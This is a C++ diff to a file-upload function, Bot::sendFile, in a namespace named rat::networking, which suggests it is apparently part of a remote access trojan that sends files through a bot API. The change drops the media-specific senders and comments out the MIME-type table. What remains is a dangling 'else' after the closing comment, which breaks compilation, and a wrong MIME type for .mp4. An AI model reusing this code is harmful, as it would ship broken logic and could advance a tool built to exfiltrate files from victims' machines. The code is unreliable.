@@ -166,14 +166,7 @@ BotResponse Bot::sendFile(const std::filesystem::path& File_Path, const std::str
         // Route to specialized methods
         if (extension == ".jpg" || extension == ".jpeg" || extension == ".png") {
             return this->sendPhoto(File_Path, arg_Caption);
-        } else if (extension == ".mp3" || extension == ".m4a") {
-            return this->sendAudio(File_Path, arg_Caption);
-        } else if (extension == ".ogg") {
-            return this->sendVoice(File_Path, arg_Caption);
-        } else if (extension == ".mp4") {
-            return this->sendVideo(File_Path, arg_Caption);
         }
-
         // Otherwise, treat it as a generic document
         rat::networking::MimeContext ctx;
         ctx.file_path       = File_Path;
@@ -184,10 +177,14 @@ BotResponse Bot::sendFile(const std::filesystem::path& File_Path, const std::str
         if (!arg_Caption.empty()) {
             ctx.fields_map["caption"] = arg_Caption;
         }
-
+/*
         // Map common MIME types 
         if (extension == ".txt") ctx.mime_type = "text/plain";
-	      else if (extension == ".pdf") ctx.mime_type = "application/pdf";
+        else if (extension == ".mp3") ctx.mime_type = "audio/mp3";
+
+        else if (extension == ".ogg") ctx.mime_type = "audio/ogg";
+        else if (extension == ".mp4") ctx.mime_type = "video/mpeg";
+        else if (extension == ".pdf") ctx.mime_type = "application/pdf";
 	      else if (extension == ".zip") ctx.mime_type = "application/zip";
 	      else if (extension == ".rar") ctx.mime_type = "application/vnd.rar";
 	      else if (extension == ".7z") ctx.mime_type = "application/x-7z-compressed";
@@ -203,8 +200,8 @@ BotResponse Bot::sendFile(const std::filesystem::path& File_Path, const std::str
 	      else if (extension == ".wav") ctx.mime_type = "audio/wav";
 	      else if (extension == ".mov") ctx.mime_type = "video/quicktime";
 	      else if (extension == ".avi") ctx.mime_type = "video/x-msvideo";
-	      else ctx.mime_type = "application/octet-stream"; // fallback
-	
+        else ctx.mime_type = "application/octet-stream"; // fallback
+*/      else ctx.mime_type = "document";	
         bool result = curl_client.uploadMimeFile(ctx);
         if (!result) {
             ERROR_LOG("Failed at uploading file: {}", File_Path.string());
